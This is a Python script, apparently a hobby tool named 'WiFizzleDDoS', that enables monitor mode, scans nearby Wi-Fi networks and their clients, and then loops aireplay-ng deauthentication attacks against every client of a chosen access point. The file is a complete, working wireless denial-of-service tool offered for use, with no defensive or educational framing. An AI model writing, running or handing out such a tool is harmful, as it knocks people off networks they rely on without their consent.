import os
import subprocess
import time
import signal

# ANSI escape codes for colors
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

class WiFizzleDDoS:
    def __init__(self):
        self.interface = self.get_wifi_interface()
        self.deauth_running = False
        if not self.interface:
            print(f"{RED}No Wi-Fi interface found!{ENDC}")
            exit(1)
        print(f"Wi-Fi interface: {self.interface}")

    def get_wifi_interface(self):
        cmd = """iw dev | awk '$1=="Interface"{print $2}'"""
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        return result.stdout.strip()

    def parse_bssids_from_csv(self, csv_file):
        bssids = []
        ssid_map = {}
        with open(csv_file, 'r') as f:
            lines = f.readlines()

        for line in lines:
            parts = line.split(',')
            if len(parts) > 13 and len(parts[0].strip()) == 17:
                bssid = parts[0].strip()
                ssid = parts[13].strip()
                bssids.append(bssid)
                ssid_map[bssid] = ssid

        return bssids, ssid_map

    def parse_clients_from_csv(self, csv_file):
        clients = []
        with open(csv_file, 'r') as f:
            lines = f.readlines()

        for line in lines:
            parts = line.split(',')
            if len(parts) > 5 and len(parts[0].strip()) == 17:
                client_mac = parts[0].strip()
                clients.append(client_mac)

        return clients

    def start_monitor_mode(self):
        print(f"{GREEN}Starting monitor mode...{ENDC}")
        os.system(f"sudo airmon-ng start {self.interface}")
        self.interface = self.get_wifi_interface()

    def stop_monitor_mode(self):
        print(f"{GREEN}Stopping monitor mode...{ENDC}")
        os.system(f"sudo airmon-ng stop {self.interface}")

    def scan_wifi_networks(self):
        print(f"{GREEN}Scanning for Wi-Fi networks...{ENDC}")
        csv_file = "scan_results.csv"
        subprocess.run(f"sudo airodump-ng --write-interval 1 --write {csv_file} --output-format csv {self.interface}", shell=True, check=True)
        time.sleep(10)
        bssids, ssid_map = self.parse_bssids_from_csv(f"{csv_file}-01.csv")
        if not bssids:
            if os.path.exists("scan_results.csv-01.csv"):
                subprocess.run("sudo rm scan_results.csv-01.csv", shell=True, check=True)
            print(f"{RED}No networks found!{ENDC}")
            return None, None
        return bssids, ssid_map

    def scan_clients(self, bssid):
        print(f"{GREEN}Scanning for clients on BSSID {bssid}...{ENDC}")
        csv_file = "client_scan_results.csv"
        subprocess.run(f"sudo airodump-ng --bssid {bssid} --write-interval 1 --write {csv_file} --output-format csv {self.interface}", shell=True, check=True)
        time.sleep(10)
        clients = self.parse_clients_from_csv(f"{csv_file}-01.csv")
        if not clients:
            if os.path.exists("client_scan_results.csv-01.csv"):
                subprocess.run("sudo rm client_scan_results.csv-01.csv", shell=True, check=True)
            print(f"{RED}No clients found!{ENDC}")
            return None
        return clients

    def deauthenticate_clients(self, bssid, clients, num_packets, interval):
        print(f"{YELLOW}Deauthenticating clients from BSSID {bssid}...{ENDC}")
        self.deauth_running = True
        try:
            while self.deauth_running:
                for client in clients:
                    print(f"{BLUE}Deauthenticating client: {client}{ENDC}")
                    cmd = f"sudo aireplay-ng -D --deauth {num_packets} --ignore-negative-one -a {bssid} -c {client} {self.interface}"
                    subprocess.run(cmd, shell=True, check=True)
                    time.sleep(interval)
        except subprocess.CalledProcessError as e:
            if e.returncode == 130:
                print(f"{RED}Deauthentication process interrupted!{ENDC}")
                self.handle_keyboard_interrupt()
            else:
                raise

    def handle_scan_networks(self):
        bssids, ssid_map = self.scan_wifi_networks()
        if not bssids:
            return
        print(f"\n{GREEN}Available Networks:{ENDC}")
        for idx, bssid in enumerate(bssids):
            print(f"{idx+1}. {bssid} ({ssid_map[bssid]})")
        try:
            selected_index = int(input(f"\nSelect a network by number (1-{len(bssids)}): ")) - 1
            if selected_index < 0 or selected_index >= len(bssids):
                print(f"{RED}Invalid selection!{ENDC}")
                return
            selected_bssid = bssids[selected_index]
            print(f"{YELLOW}Selected BSSID: {selected_bssid} ({ssid_map[selected_bssid]}){ENDC}")

            while True:
                clients = self.scan_clients(selected_bssid)
                if clients:
                    print(f"\n{GREEN}Available Clients:{ENDC}")
                    for idx, client in enumerate(clients):
                        print(f"{idx+1}. {client}")
                    num_packets = 10  # Set a default number of deauthentication packets
                    interval = 1  # Set a default interval between packets (in seconds)
                    self.deauthenticate_clients(selected_bssid, clients, num_packets, interval)
                else:
                    print(f"{RED}No clients found, rescanning...{ENDC}")
                    time.sleep(5)  # Wait before rescanning for clients
        except ValueError:
            print(f"{RED}Invalid input! Please enter a valid number.{ENDC}")

    def exit_program(self):
        print(f"{RED}Exiting...{ENDC}")
        self.deauth_running = False
        if 'mon' in self.interface:
            self.stop_monitor_mode()
        os.system(f"sudo rm scan_results.csv-01.csv")
        os.system(f"sudo rm client_scan_results.csv-01.csv")

    def handle_keyboard_interrupt(self, signum=None, frame=None):
        print(f"\n\n{RED}Program interrupted!{ENDC}")
        i2 = input("Exit? [y/n]? ")
        if i2.lower() == "y":
            self.exit_program()
            exit(0)
        elif i2.lower() == "n":
            pass

    def run(self):
        print("Please wait.....")
        print(f"""{BLUE}
██╗    ██╗██╗███████╗██╗███████╗███████╗██╗     ███████╗
██║    ██║██║██╔════╝██║╚══███╔╝╚══███╔╝██║     ██╔════╝
██║ █╗ ██║██║█████╗  ██║  ███╔╝   ███╔╝ ██║     █████╗  
██║███╗██║██║██╔══╝  ██║ ███╔╝   ███╔╝  ██║     ██╔══╝  
╚███╔███╔╝██║██║     ██║███████╗███████╗███████╗███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝
        """)
        signal.signal(signal.SIGINT, self.handle_keyboard_interrupt)
        while True:
            print(f"""\n{YELLOW}
1. Start monitor mode
2. Exit monitor mode 
3. Scan Wi-Fi networks
4. Exit
{ENDC}""")
            try:
                i = input("\n O.W.D > ")
                if i == '1':
                    self.start_monitor_mode()
                elif i == '2':
                    self.stop_monitor_mode()
                elif i == '3':
                    self.handle_scan_networks()
                elif i == '4':
                    self.exit_program()
                    break
                else:
                    print(f"{RED}Invalid option! Please choose a valid number.{ENDC}")
            except KeyboardInterrupt:
                self.handle_keyboard_interrupt()

if __name__ == "__main__":
    WiFizzleDDoS().run()
